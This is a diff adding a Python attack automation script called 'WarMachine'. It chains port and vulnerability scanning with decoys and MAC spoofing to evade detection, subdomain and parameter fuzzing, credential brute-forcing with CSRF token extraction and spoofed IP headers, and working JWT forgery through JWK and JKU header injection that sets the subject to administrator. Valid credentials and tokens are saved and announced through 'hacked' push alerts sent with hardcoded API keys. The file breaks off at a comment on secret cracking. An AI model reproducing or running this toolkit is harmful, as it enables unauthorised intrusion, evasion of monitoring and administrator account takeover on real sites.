@@ -1,0 +1,1556 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Created on Sun Jul 28 18:56:47 2024
+
+@author: blanco
+"""
+
+import os
+import sys
+import re
+import json
+import random
+import curses
+import time
+import asyncio
+import aiofiles
+from concurrent.futures import ThreadPoolExecutor
+import csv
+import httpx
+import urllib3
+from bs4 import BeautifulSoup
+import base64
+import jwt
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+import logging
+import aiohttp
+import ssl
+import certifi
+import signal
+from urllib.parse import quote
+import bane
+from bane.scanners.vulnerabilities import XSS_Scanner
+
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+# SSL context setup
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Pushover authentication details
+PUSHOVER_USER_KEY = 'u6qoy72x32yvgdcbedhihk7vj59wgn'  # Replace with your Pushover User Key
+PUSHOVER_API_TOKEN = 'aokbkm4rcgcnq6iavfmbj1qdgb7k74'  # Replace with your Pushover API Token
+PUSHOVER_SOUNDS = {
+    'scanning': 'Scanning',
+    'hacked': 'Hacked'
+}
+
+
+
+def check_root():
+    if os.geteuid() != 0:
+        logging.info("This script must be run as root. Please rerun with 'sudo'.")
+        # Set the effective user ID to 0 (root)
+        os.setuid(0)
+
+check_root()
+
+# Setup logging to log to both console and file
+def setup_logging():
+    """Setup logging configuration to log to both console and file."""
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+
+    log_file = 'WarMachine.log'
+
+    # Check if handlers are already set up to prevent duplicate handlers
+    if not logger.hasHandlers():
+        # File handler
+        file_handler = logging.FileHandler(log_file)
+        file_handler.setLevel(logging.INFO)
+        
+        # Console handler
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(logging.INFO)
+
+        # Formatter for both handlers
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+        file_handler.setFormatter(formatter)
+        console_handler.setFormatter(formatter)
+
+        # Adding both handlers to the logger
+        logger.addHandler(file_handler)
+        logger.addHandler(console_handler)
+
+# Initialize logging setup
+setup_logging()
+# Send a notification via Pushover
+async def send_pushover_notification(message, sound_key='hacked'):
+    """Send a Pushover notification with the specified sound."""
+    logging.debug(f"Preparing to send Pushover notification: {message}")
+    async with aiohttp.ClientSession() as session:
+        try:
+            payload = {
+                'token': PUSHOVER_API_TOKEN,
+                'user': PUSHOVER_USER_KEY,
+                'message': message,
+                'sound': PUSHOVER_SOUNDS.get(sound_key, 'Hacked')
+            }
+            async with session.post('https://api.pushover.net/1/messages.json', data=payload) as response:
+                response.raise_for_status()  # Raise an error if the request failed
+                logging.info(f"Sent Pushover notification with {sound_key} sound.")
+        except aiohttp.ClientError as e:
+            logging.error(f"Failed to send Pushover notification: {e}")
+            sys.exit(0)
+
+
+# Generate a random public IP address for spoofing
+async def generate_random_public_ip():
+    while True:
+        ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
+        octets = ip.split('.')
+        # Ensure the IP address is a valid public IP address
+        if (1 <= int(octets[0]) <= 126 or 128 <= int(octets[0]) <= 191 or 192 <= int(octets[0]) <= 223):
+            if not (ip.startswith("10.") or ip.startswith("192.168.") or (ip.startswith("172.") and 16 <= int(octets[1]) <= 31) or ip.startswith("127.") or ip == "0.0.0.0" or ip == "255.255.255.255"):
+                logging.debug(f"Generated random public IP: {ip}")
+                return ip
+
+
+# Generate a random MAC address for spoofing
+async def generate_random_mac():
+    # Create a random MAC address using a specific range of values
+    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
+    mac_address = ':'.join(map(lambda x: format(x, '02x'), mac))
+    logging.debug(f"Generated random MAC address: {mac_address}")
+    return mac_address
+
+# Generate headers with spoofed IP and MAC address
+async def get_spoofed_headers():
+    spoofed_ip = await generate_random_public_ip()  # Generate a random public IP
+    spoofed_mac = await generate_random_mac()  # Generate a random MAC address
+    headers = {
+        'X-Forwarded-For': spoofed_ip,  # Spoofed IP header to mimic a different client
+        'Client-IP': spoofed_ip,        # Another spoofed IP header
+        'X-MAC-Address': spoofed_mac,   # Custom header to simulate a MAC address
+        'Content-Type': 'application/json'  # Set to JSON as we are sending JSON payloads
+    }
+    logging.info(f"Using spoofed IP: {spoofed_ip}, spoofed MAC: {spoofed_mac}")
+    return headers
+
+# Function to save valid credentials to a file
+async def save_credentials_to_file(username, password, outputs):
+    with open(f"{outputs}/attacks/valid_credentials.txt", "a") as file:
+        file.write(f"Username: {username}, Password: {password}\n")
+    logging.info(f"Credentials saved: Username={username}, Password={password}")
+    await send_pushover_notification(f"save credentials to file {username}: {password}", sound_key='hacked')
+    time.sleep(5)
+
+
+
+# run_command with timeout support
+async def run_command(command, output_queue=None, log_file=None, timeout=None):
+    try:
+        proc = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        
+        # Add timeout support using asyncio.wait_for
+        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+
+        # Handle stdout and stderr if needed
+        if output_queue:
+            await output_queue.put(f"Command: {command}\nOutput: {stdout.decode().strip()}\n")
+
+        if log_file:
+            async with aiofiles.open(log_file, 'a') as f:
+                await f.write(stdout.decode() + '\n')
+
+        return stdout.decode(), stderr.decode()
+
+    except asyncio.TimeoutError:
+        if output_queue:
+            await output_queue.put(f"Command: {command} timed out")
+        return "", "Command timed out"
+    except Exception as e:
+        if output_queue:
+            await output_queue.put(f"Error running command {command}: {str(e)}")
+        return "", str(e)
+
+# Check if Tor is available for a given IP asynchronously
+async def check_tor(ip):
+    command = f"proxychains curl http://{ip}"
+    output, error = await run_command(command, timeout=10)
+    if "Failed to connect" in error:
+        logging.info("Tor failed to connect.")
+        return False
+    logging.info("Tor Connected.")
+    return True
+
+# check_webproxy function
+async def check_webproxy():
+    command = "curl -I http://127.0.0.1:8080"
+    output, error = await run_command(command, timeout=10)
+    if "Failed to connect" in error:
+        logging.info("Proxies failed to connect.")
+        return False
+    logging.info("Proxies Connected.")
+    return True
+
+async def fetch_content(session, url):
+    try:
+        async with session.get(url) as response:
+            # Read and return the response text content
+            return await response.text()
+    except Exception as e:
+        print(f"Failed to fetch {url}: {e}")
+        return None
+
+
+
+
+# Create a directory asynchronously if it doesn't exist
+async def create_directory(path):
+    if not os.path.exists(path):
+        os.makedirs(path)
+        logging.info(f"Directory '{path}' created successfully.")
+    else:
+        logging.info(f"Directory '{path}' already exists.")
+        
+# Function to prepare directories
+async def prepare_directories(outputs, IP, user, log_file):
+    try:
+        dirs = [
+            f'{outputs}/scan/Nmap',
+            f'{outputs}/cherry',
+            f'{outputs}/recon',
+            f'{outputs}/attacks',
+            f'{outputs}/zap'
+        ]
+
+        # Create directories if they don't exist
+        for directory in dirs:
+            os.makedirs(directory, exist_ok=True)
+
+        # Write IP to URL.log using Python file handling
+        async with aiofiles.open(f'{outputs}/recon/URL.log', 'w') as file:
+            await file.write(f"https://{IP}\n")
+
+        # Set proper ownership for the user
+        chown_command = f'sudo chown -R {user}:{user} {outputs}/*'
+        await run_command(chown_command, None, log_file=log_file)
+
+    except Exception as e:
+        logging.info(f"Error preparing directories: {e}")
+
+async def extract_domains_from_file(file_path):
+    subdomains = set()
+    try:
+        async with aiofiles.open(file_path, 'r') as file:
+            reader = csv.DictReader(await file.readlines())
+            # Assuming the "url" field in CSV contains the subdomain URL
+            for row in reader:
+                if "url" in row and row["url"]:
+                    subdomains.add(row["url"].strip())
+    except Exception as e:
+        logging.info(f"Error reading subdomains from file: {e}")
+    return list(subdomains)
+
+
+# Function to read the file and return its content asynchronously
+async def read_file(file_path):
+    async with aiofiles.open(file_path, "r") as file:
+        content = await file.read()
+    return content
+
+# Function to fix and strip URLs from http:// or https://, then reapply the default scheme
+def fix_urls(urls):
+    fixed_urls = []
+    for url in urls:
+        # Strip 'http://' or 'https://'
+        url = re.sub(r'^https?://', '', url)
+        # Add 'http://' to ensure it's a valid URL
+        url = "https://" + url
+        fixed_urls.append(url)
+    return fixed_urls
+
+# Async function to send HTTP GET requests using httpx.AsyncClient
+async def send_request(client, url):
+    try:
+        response = await client.get(url, follow_redirects=True)
+        return url, response.status_code
+    except httpx.HTTPStatusError as e:
+        # Return status code for non-2xx responses
+        return url, e.response.status_code
+    except httpx.RequestError as e:
+        # Handle any errors during the request
+        logging.info(f"Error with URL {url}: {e}")
+        return url, None
+
+# Function to categorize URLs and save to respective files based on status code
+async def categorize_and_save(url_status_map, outputs):
+    # Status code categories
+    files = {
+        '200': [],
+        '300': [],
+        '400': [],
+        '500': []
+    }
+
+    # Categorize URLs by status code
+    for url, status_code in url_status_map.items():
+        if status_code:
+            if 200 <= status_code < 300:
+                files['200'].append(url)
+            elif 300 <= status_code < 400:
+                files['300'].append(url)
+            elif 400 <= status_code < 500:
+                files['400'].append(url)
+            elif 500 <= status_code < 600:
+                files['500'].append(url)
+
+    # Write categorized URLs to corresponding files asynchronously
+    for category, urls in files.items():
+        if urls:  # Only write if there are URLs in the category
+            async with aiofiles.open(f"{outputs}/recon/{category}.txt", 'a') as file:
+                for url in urls:
+                    await file.write(f"{url}\n") 
+
+# Processes_URLS function: Read and process URLs concurrently
+async def Processes_URLS(file_path, outputs):
+    # Read the file content asynchronously
+    content = await read_file(file_path)
+    urls = content.splitlines()
+
+    # Clean URLs by removing 'http://' or 'https://', and reapplying 'http://'
+    clean_urls = fix_urls(urls)
+
+    # Dictionary to hold URL and corresponding status codes
+    url_status_map = {}
+
+    # Create an async client to manage connections
+    async with httpx.AsyncClient() as client:
+        # Gather all tasks for sending requests asynchronously
+        tasks = [send_request(client, url) for url in clean_urls]
+        responses = await asyncio.gather(*tasks)
+
+    # Collect results in the URL status map
+    for url, status_code in responses:
+        if status_code:
+            logging.info(f"URL: {url} returned status: {status_code}")
+        url_status_map[url] = status_code
+
+    # Categorize and save URLs by their status codes
+    await categorize_and_save(url_status_map, outputs)
+
+
+
+
+# Function to read URLs from a file
+async def read_urls_from_file(filepath):
+    try:
+        async with aiofiles.open(filepath, 'r') as file:
+            return [line.strip() async for line in file]
+    except Exception as e:
+        print(f"Error reading file {filepath}: {e}")
+        return []
+
+async def fetch_response_length(url):
+    # Append the custom parameter to the URL
+    modified_url = f"https://{url}/?googfygoober=<"
+
+    # Async with aiohttp for a non-blocking GET request
+    connector = aiohttp.TCPConnector(ssl=ssl_context)  # Use SocksConnector to handle SOCKS5 proxy
+    #connector = ProxyConnector.from_url('http://127.0.0.1:8080')
+    async with aiohttp.ClientSession(connector=connector) as session:
+        async with session.get(modified_url) as response:
+            # Get response content and calculate its length
+            content = await response.read()
+            logging.info("Response length:", len(content))
+            return len(content)
+            
+# Function to execute enumeration stage (subdomain, directory, and parameter enumeration)
+async def enumeration_stage(IP, details, dirlist, sublist, paralist, tor, ffuf2burp, URLLog, speed, outputs, output_queue, log_file):
+    # Log files for each stage
+    EnumSub = f'{outputs}/recon/SubFfuf.txt'
+    
+    domains_found = set()
+    
+    # Add base HOST to the set of subdomains
+    domains_found.add(IP)
+
+    domains = list(domains_found)
+
+    # Subdomain Enumeration Task
+    async def subdomain_enum(HOST, sublist, speed, outputs, output_queue, log_file):
+        logging.info('Starting enumeration of subdomains.')
+        subdomain_enum_command = f'sudo ffuf -w {sublist} -u https://{HOST} -H "Host: FUZZ.{HOST}" {speed} -fw 9 -o {EnumSub} >> {log_file} 2>&1'
+        await run_command(subdomain_enum_command, output_queue=output_queue, log_file=log_file)
+        
+        subdomains = await extract_domains_from_file(EnumSub)
+        domains_found.update(subdomains)
+
+        # Append subdomains to URL.log after discovery
+        async with aiofiles.open(URLLog, 'a') as f:
+            for sub in subdomains:
+                await f.write(f"{sub}\n")
+    
+        await output_queue.put(f"Subdomains found: {subdomains}")
+        
+        return list(domains_found)
+    
+    
+ 
+    # Directory Enumeration Task
+    async def directory_enum(subdomains, dirlist, speed, outputs, output_queue, log_file):
+        dir_enum_tasks = []  # Initialize the task list here
+        logging.info('Starting enumeration of directory.')
+        for sub in subdomains:  # Iterate over subdomains correctly
+            EnumDir = f'{outputs}/recon/{sub}_feroxdir.txt'
+            dir_enum_command = f'feroxbuster --url https://{sub} -w {dirlist} {speed} --silent -o {EnumDir} >> {URLLog} 2>&1'
+    
+            # Append the directory enumeration task to the list
+            dir_enum_task = run_command(dir_enum_command, output_queue=output_queue, log_file=EnumDir)
+            dir_enum_tasks.append(dir_enum_task)
+        
+
+        domains = await extract_domains_from_file(URLLog)
+        domains_found.update(domains)
+        # Run directory enumeration tasks concurrently
+        await asyncio.gather(*dir_enum_tasks)
+        return list(domains_found)
+
+
+    # Parameter Enumeration Task
+    # Parameter Enumeration Task
+    async def parameter_enum(domains, paralist, speed, outputs, output_queue, log_file):
+        para_enum_tasks = []
+        
+        logging.info('Starting enumeration of parameters.')
+        
+        for dom in domains:
+            logging.info(f'Checking parameters for {dom}.')
+            
+            # Fetch and calculate response length to filter false positives
+            length = await fetch_response_length(dom)
+            logging.info(f'Response length for {dom} is {length}.')
+            
+            # Unique file for each domain's parameter enumeration
+            EnumPara = f'{outputs}/recon/inject_{dom}.json'  # Ensure JSON format output
+            
+            # Construct the ffuf command with the custom response length filter and JSON output
+            para_enum_command = f'ffuf -u "https://{dom}/?FUZZ=test" {speed} -fs {length} -w {paralist} -o {EnumPara} -of json >> {log_file} 2>&1'
+            
+            # Run ffuf command asynchronously
+            para_enum_task = run_command(para_enum_command, output_queue=output_queue, log_file=EnumPara)
+            para_enum_tasks.append(para_enum_task)
+        
+        # Run parameter enumeration tasks concurrently
+        await asyncio.gather(*para_enum_tasks)
+        
+        # Process each JSON output file to extract parameters
+        found_params = []
+        for dom in domains:
+            EnumPara = f'{outputs}/recon/inject_{dom}.json'
+            try:
+                # Load JSON data from file
+                with open(EnumPara, 'r') as f:
+                    json_data = json.load(f)
+                    
+                # Extract the base URL from the commandline
+                base_url = json_data['commandline'].split(" -u ")[1].split(" -t")[0].replace("?FUZZ=test", "")
+                
+                # Extract parameter names where status is 200
+                for result in json_data.get('results', []):
+                    if result['status'] == 200:
+                        param = result['input']['FUZZ']
+                        found_params.append(f"{base_url}?{param}=")
+            
+            except (json.JSONDecodeError, FileNotFoundError) as e:
+                logging.error(f"Error processing JSON output for {dom}: {e}")
+        
+        # Save the parameters to a central file (inject.txt)
+        with open(f"{outputs}/recon/inject.txt", "w") as file:
+            for url in found_params:
+                file.write(url + "\n")
+    
+
+    '''
+    # Run Subdomain Enumeration first, as it is a dependency for other tasks
+    domains = await subdomain_enum(IP, sublist, speed, outputs, output_queue, log_file)
+    logging.info('Enumeration of subdomains completed.')
+
+    # Now run directory enumeration and parameter extraction concurrently for each subdomain
+    domains = await directory_enum(domains, dirlist, speed, outputs, output_queue, log_file)
+    logging.info('Enumeration of directory completed.')
+    '''
+    await parameter_enum(domains, paralist, speed, outputs, output_queue, log_file)
+    logging.info('Enumeration of parameter completed.')
+
+    
+
+
+# Function to initialize the details dictionary
+def initialize_details(tor, webproxy, ffuf2burp, IP):
+    details = {
+        'tor': tor,
+        'webproxy': webproxy,
+        'ffuf2burp': ffuf2burp,
+        'IP': IP,
+        'open_ports': set(),
+        'http_ports': set(),
+        'https_ports': set(),
+        'domain_name': None,
+        'os_details': None,
+        'services': set(),
+        'targets_string': ""
+    }
+    return details
+
+
+# Extract details from command output using regular expressions
+def extract_details(output):
+    patterns = {
+        'open_ports': re.compile(r'(\d+)/tcp\s+open'),
+        'http_ports': re.compile(r'(\d+)/tcp\s+open\s+http'),
+        'https_ports': re.compile(r'(\d+)/tcp\s+open\s+https'),
+        'domain': re.compile(r'Nmap scan report for ([a-zA-Z0-9.-]+\.[a-zA-Z]{2,6})'), # Improved regex for domain names
+        'os': re.compile(r'Service Info: OS: ([^;]+)'), # Improved regex for OS details
+        'os_guess': re.compile(r'Aggressive OS guesses: ([^\n]+)'), # Regex for aggressive OS guesses
+        'apache': re.compile(r'Apache'),
+        'nginx': re.compile(r'nginx'),
+        'sql': re.compile(r'MySQL|PostgreSQL|Microsoft SQL Server|Oracle Database')
+    }
+
+    details = {
+        'open_ports': set(),
+        'http_ports': set(),
+        'https_ports': set(),
+        'domain': None,
+        'os': None,
+        'services': set()
+    }
+
+    for key, pattern in patterns.items():
+        matches = pattern.findall(output)
+        if key == 'domain' and matches:
+            details[key] = matches[0]
+        elif key == 'os' and matches:
+            details[key] = matches[0]
+        elif key == 'os_guess' and matches:
+            if details['os']:
+                details['os'] += f"; {matches[0]}"
+            else:
+                details['os'] = matches[0]
+        elif key in ['apache', 'nginx', 'sql'] and matches:
+            details['services'].update(matches)
+        elif matches:
+            details[key].update(matches)
+
+    # Debugging: Print extracted details
+    logging.info(f"Extracted details: {details}")
+
+    return details
+
+# Add Threading (Optional)
+# Function to wrap I/O bound tasks into threads for performance gains
+def run_in_thread_pool(func, *args):
+    with ThreadPoolExecutor() as executor:
+        return asyncio.get_event_loop().run_in_executor(executor, func, *args)
+
+
+# Example of how to use `run_in_thread_pool` if blocking I/O tasks are present
+# You can replace `run_command` with `run_in_thread_pool(run_command, ...)` for blocking subprocesses.
+
+# Update fingerprint file
+async def update_fingerprint(fingerprint_file, details):
+    async with aiofiles.open(fingerprint_file, "w") as f:
+        await f.write(f"Proxys: {details['tor']}, {details['webproxy']}, {details['ffuf2burp']} \n")
+        await f.write(f"Domain: {details['domain_name']}\n")
+        await f.write(f"Domain to IP: {details['IP']}\n")
+        await f.write(f"All Open Ports: {list(details['open_ports'])}\n")
+        await f.write(f"HTTP Ports: {list(details['http_ports'])}\n")
+        await f.write(f"HTTPS Ports: {list(details['https_ports'])}\n")
+        await f.write(f"Targets: {details['targets_string']}\n")
+        await f.write(f"OS Details: {details['os_details']}\n")
+        await f.write(f"Services: {', '.join(details['services'])}\n")
+
+# Define the fingerprint_stage function BEFORE main
+async def fingerprint_stage(IP, tor, webproxy, ffuf2burp, speed_option, outputs, details, output_queue, log_file):
+    # Define fingerprint commands
+    fingerprint_commands = [
+        f"{tor} ping -c 2 {IP}",
+        f"{tor} sudo rustscan -t 2000 -b 2000 --ulimit 2000 -r 0-65535 -a {IP} | sudo tee rust.txt",
+        f"{tor} sudo nmap -p- {speed_option} {webproxy} -sT -vvv {IP} -oA {outputs}/scan/Nmap/ports",
+        f"{tor} sudo nmap -sS -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts --badsum -Pn {speed_option} {webproxy} -vvv  {IP} -oA {outputs}/scan/Nmap/hush", 
+        f"{tor} sudo nmap -p 1-65535 -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -sA -vvv  {IP} -oA {outputs}/scan/Nmap/gen",
+        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -sS -vvv -O {IP} -oA {outputs}/scan/Nmap/OS",
+        f"{tor} sudo nmap -f -D RND:10 --spoof-mac 00:11:22:33:44:55 -g 53 --mtu 16 --randomize-hosts {speed_option} {webproxy} -vvv --script=vuln {IP} -oA {outputs}/scan/Nmap/vuln"
+    ]
+
+    # Run the fingerprint commands asynchronously
+    fingerprint_tasks = [run_command(command, output_queue=output_queue, log_file=log_file) for command in fingerprint_commands]
+    results = await asyncio.gather(*fingerprint_tasks)
+
+    # Process the results
+    for output, error in results:
+        if error:
+            await output_queue.put(f"Error: {error}")
+            continue
+        await output_queue.put(f"Output: {output}")
+        scan_details = extract_details(output)
+        details['open_ports'].update(scan_details['open_ports'])
+        details['http_ports'].update(scan_details['http_ports'])
+        details['https_ports'].update(scan_details['https_ports'])
+        if scan_details['domain']:
+            details['domain_name'] = scan_details['domain']
+        if scan_details['os']:
+            details['os_details'] = scan_details['os']
+        details['services'].update(scan_details['services'])
+
+        # Update fingerprint file after each scan
+        targets = [f"{IP}:{port}" for port in details['http_ports'] | details['https_ports']]
+        details['targets_string'] = ", ".join(targets)
+        fingerprint_file = os.path.join(outputs, "fingerprint.txt")
+        await update_fingerprint(fingerprint_file, details)
+
+# Extract CSRF token from the login page
+async def get_csrf_token(session, login_page_url):
+    logging.info("(+) Fetching login page to extract CSRF token...")
+    try:
+        # Use aiohttp's session to fetch the login page
+        async with session.get(login_page_url, ssl=ssl_context) as response:
+            logging.debug(f"Login page response status: {response.status}")
+            if response.status != 200:
+                logging.error(f"(-) Failed to fetch login page, status code: {response.status}")
+                return None
+
+            # Parse the response to extract the CSRF token
+            soup = BeautifulSoup(await response.text(), 'html.parser')
+
+            csrf_token_input = soup.find('input', {'name': 'csrf'})  # Check for the CSRF token
+            if not csrf_token_input:
+                csrf_token_input = soup.find('input', {'name': '_csrf'})  # Check for alternative CSRF token name
+            if csrf_token_input:
+                csrf_token = csrf_token_input.get('value')
+                logging.info(f"(+) CSRF token found: {csrf_token}")
+                return csrf_token
+            else:
+                logging.error("(-) CSRF token not found in the login page!")
+                return None
+    except aiohttp.ClientError as e:
+        logging.error(f"(-) Exception occurred while fetching login page: {e}")
+        return None
+
+
+#Define a helper function to fetch the JWT from session cookies
+def extract_jwt_from_set_cookie(response):
+    """Extract JWT from aiohttp response cookies."""
+    if 'session' in response.cookies:
+        cookie = response.cookies['session']
+        logging.info(f"(+) JWT token retrieved: {cookie.value}")
+        return cookie.value
+    else:
+        logging.error("(-) 'session' cookie not found in the response.")
+        return None
+
+# Login function to authenticate using provided credentials
+async def login(login_url, username, password):
+    logging.debug(f"Attempting to login with URL: {login_url}, Username: {username}")
+
+     # Use aiohttp.ClientSession() to create a session with proxy support
+    connector = aiohttp.TCPConnector(ssl=ssl_context)  # Use SocksConnector to handle SOCKS5 proxy
+    #connector = ProxyConnector.from_url('http://127.0.0.1:8080')
+    async with aiohttp.ClientSession(connector=connector) as session:
+        csrf_token = await get_csrf_token(session, login_url)  # Fetch CSRF token
+
+
+        if not csrf_token:
+            logging.error(f"(-) Cannot proceed without CSRF token. From {login_url} Login aborted.")
+            return None
+
+        # Prepare login parameters
+        login_params = {'csrf': csrf_token, 'username': username, 'password': password}
+
+        try:
+            # Use aiohttp's session to post the login data
+            async with session.post(
+                login_url,
+                data=login_params,
+                headers=await get_spoofed_headers(),
+                proxy='http://127.0.0.1:8080',
+                allow_redirects=False
+            ) as response:
+                logging.debug(f"Login response status: {response.status}")
+                if response.status == 302:  # Successful login (HTTP 302 means redirect)
+                    logging.info(f"(+) Login {username}:{password} is successful.")
+                    jwt_token = extract_jwt_from_set_cookie(response)  # Extract JWT token from cookies
+                    if jwt_token:
+                        logging.info(f"(+) JWT token retrieved: {jwt_token}")
+                        return username, password, jwt_token
+                    else:
+                        logging.error("(-) JWT not found in session cookies.")
+                        return username, password
+                else:
+                    logging.error(f"(-) Login {username}:{password} not successful, Status Code: {response.status}")
+                    return csrf_token
+        except aiohttp.ClientError as e:
+            logging.error(f"(-) Error during login attempt: {e}")
+            return None
+        except ssl.SSLError as e:
+            logging.error(f"(-) SSL Error during login attempt: {e}")
+            return None
+
+
+
+# Generate RSA key pair for JWT signing
+def generate_rsa_key_pair():
+    logging.info("(+) Generating RSA key pair...")
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+
+    public_key = private_key.public_key()
+
+    # Export the private key for signing
+    private_key_pem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+
+    # Extract the public key components for the JWK header
+    public_numbers = public_key.public_numbers()
+    e_b64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
+    n_b64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
+
+    return private_key_pem, e_b64, n_b64
+
+
+
+
+async def fetch_page_content(session, url, headers=None, cookies=None):
+    """Fetch the content of a page and return its length."""
+    async with session.get(url, headers=headers, cookies=cookies, ssl=False) as response:
+        if response.status == 200:
+            content = await response.text()
+            return len(content), content
+        else:
+            logging.error(f"(-) Failed to fetch page at {url}, Status Code: {response.status}")
+            return None, None
+
+async def login_with_jwt_comparison(login_url, jwt_token, token_owner, outputs):
+    """
+    Compare the /login page content with and without the JWT token.
+    If the lengths of the content are not equal, the token has worked.
+    """
+    
+    async with aiohttp.ClientSession() as session:
+        # Step 1: Fetch the login page without any credentials (pre-login state)
+        logging.info(f"(+) Fetching login page without credentials at {login_url}")
+        pre_login_length, pre_login_content = await fetch_page_content(session, login_url)
+
+        if pre_login_length is None:
+            logging.error("(-) Failed to fetch the login page pre-login.")
+            return False
+
+        logging.info(f"(+) Length of /login page pre-login (no credentials): {pre_login_length}")
+
+        # Step 2: Fetch the login page again, this time using the JWT token
+        headers = {
+            'Authorization': f'Bearer {jwt_token}'  # Option 1: Send JWT as Bearer token in headers
+        }
+        cookies = {
+            'session': jwt_token  # Option 2: Send JWT as session cookie
+        }
+
+        logging.info(f"(+) Fetching login page with JWT token at {login_url}")
+        post_login_length, post_login_content = await fetch_page_content(session, login_url, headers=headers, cookies=cookies)
+
+        if post_login_length is None:
+            logging.error("(-) Failed to fetch the login page with JWT.")
+            return False
+
+        logging.info(f"(+) Length of /login page with JWT token: {post_login_length}")
+
+        # Step 3: Compare the lengths of the page content
+        if pre_login_length != post_login_length:
+            logging.info(f"(+) The page lengths are different. JWT token worked. {jwt_token}")
+            with open(f"{outputs}/attacks/{token_owner}_jwt_token.txt", "a") as file:
+                file.write(f"{jwt_token}\n")
+            await send_pushover_notification(f"JWT Token confirmed {jwt_token}", sound_key='hacked')
+            time.sleep(5)
+            return True
+        else:
+            logging.info("(-) The page lengths are the same. JWT token did not work.")
+            return False
+
+
+
+# Perform the JWT bypass via JWK header injection
+async def jwt_bypass_jwk_injection(url, token, outputs):
+    #token = extract_jwt_from_set_cookie(token)
+    # Step 1: Decode the JWT without verifying it
+    decoded_token = jwt.decode(token, options={"verify_signature": False})
+    decoded_header = jwt.get_unverified_header(token)
+    logging.info(f"(+) Decoded token: {decoded_token}")
+    logging.info(f"(+) Decoded header: {decoded_header}\n")
+
+    # Step 2: Modify the token payload to escalate privileges
+    decoded_token['sub'] = 'administrator'
+    logging.info(f"(+) Modified token: {decoded_token}\n")
+
+    # Step 3: Generate a new RSA key pair
+    private_key_pem, e_b64, n_b64 = generate_rsa_key_pair()
+
+    # Step 4: Build the JWK header with the public key
+    jwk = {
+        "kty": "RSA",
+        "e": e_b64,
+        "n": n_b64
+    }
+
+    # Step 5: Sign the modified JWT using the private key and embed the JWK in the header
+    modified_token = jwt.encode(decoded_token, private_key_pem, algorithm='RS256', headers={'jwk': jwk})
+    
+    logging.info(f"(+) Modified JWT with JWK header: {modified_token}\n")
+    
+    # Step 6: Use the modified token in an attempt to access the admin panel and delete Carlos
+    logging.info("(+) Attempting to access the admin panel with the modified JWT...")
+    
+    login_success = await login_with_jwt_comparison(url, modified_token,'administrator', outputs)
+    
+    if login_success:
+        logging.info("(+) JWT token successfully logged in.")
+    else:
+        logging.error("(-) JWT token login failed.")
+        
+async def jku_header_injection(url, attack_server, token, outputs):
+    #token = extract_jwt_from_set_cookie(token)
+    # Step 1: Generate a new RSA key pair
+    logging.info("(+) Generating a new RSA key pair for JKU header injection...")
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    
+    # Export the public key from the private key
+    public_key = private_key.public_key()
+    public_numbers = public_key.public_numbers()
+
+    # Step 2: Decode the original JWT without verifying
+    decoded_token = jwt.decode(token, options={"verify_signature": False})
+    decoded_header = jwt.get_unverified_header(token)
+    logging.info(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
+    logging.info(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")
+
+    # Build the JWK
+    jwk = {
+        "kty": "RSA",
+        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
+        "kid": decoded_header['kid'],
+        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')     
+    }
+
+
+     
+    # Step 3: Modify the token (JWT manipulation)
+    decoded_token['sub'] = 'administrator'
+    logging.info(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")
+
+    # Step 4: Sign the modified JWT using the private key
+    jku_url = attack_server  # Insert your desired malicious JKU URL
+    modified_token = jwt.encode(
+        decoded_token,
+        private_key,
+        algorithm="RS256",
+        headers={'jku': jku_url, 'kid': jwk['kid']}
+    )
+
+    keys = {"keys":[jwk]}
+    logging.info(f"JWK:\n{json.dumps(keys, indent=4)}\n")
+    
+    # Step 5: Print the modified JWT and attempt to access the admin panel
+    logging.info(f"Modified JWT with JKU header:\n{modified_token}\n")
+
+    # Step 6: Use the modified token to attempt accessing the admin panel
+    logging.info("(+) Attempting to access the admin panel with the modified JWT...")
+    login_success = await login_with_jwt_comparison(url, modified_token, 'administrator', outputs)
+    
+    if login_success:
+        logging.info("(+) JWT token successfully logged in.")
+    else:
+        logging.error("(-) JWT token login failed.")
+
+
+
+# JWT Bypass via secret cracking and re-signing
